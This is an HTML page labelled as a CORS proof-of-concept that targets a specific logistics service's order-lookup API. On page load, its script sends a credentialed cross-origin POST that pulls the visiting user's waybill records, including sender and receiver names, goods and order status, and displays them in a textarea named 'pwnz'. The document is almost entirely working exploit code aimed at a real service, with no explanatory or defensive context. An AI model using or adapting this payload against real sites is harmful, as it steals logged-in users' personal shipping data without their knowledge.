<!DOCTYPE html>
	<html>
		<head>
			<title>CORS</title>
		</head>
	<body onload="cors();">
	<center> cors proof-of-concept:<br><br> 
	<textarea rows="10" cols="60" id="pwnz"> 
	</textarea><br> 
	</div> 

	<script>
	function cors() {   
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				document.getElementById("pwnz").innerHTML = this.responseText; }   };  
		xhttp.open("POST", "https://proxy.jdwl.com/order/findWaybillOrdersByReceiveMobile", true);
		xhttp.setRequestHeader('AppParams','{"appid":"158","ticket_type":"pc"}');
		xhttp.setRequestHeader('LOP-DN','jdwl.com');
		xhttp.withCredentials = true;
		xhttp.send('["$cooMrdGatewayUid$",[{"name":"sEcho","value":1},{"name":"iColumns","value":8},{"name":"sColumns","value":",,,,,,,"},{"name":"iDisplayStart","value":0},{"name":"iDisplayLength","value":10},{"name":"mDataProp_0","value":"waybillCode"},{"name":"mDataProp_1","value":"senderName"},{"name":"mDataProp_2","value":"receiverName"},{"name":"mDataProp_3","value":"goodName"},{"name":"mDataProp_4","value":"weight"},{"name":"mDataProp_5","value":"statusId"},{"name":"mDataProp_6","value":"submitOrderTime"},{"name":"mDataProp_7","value":"status"}]]'); } 
	</script>
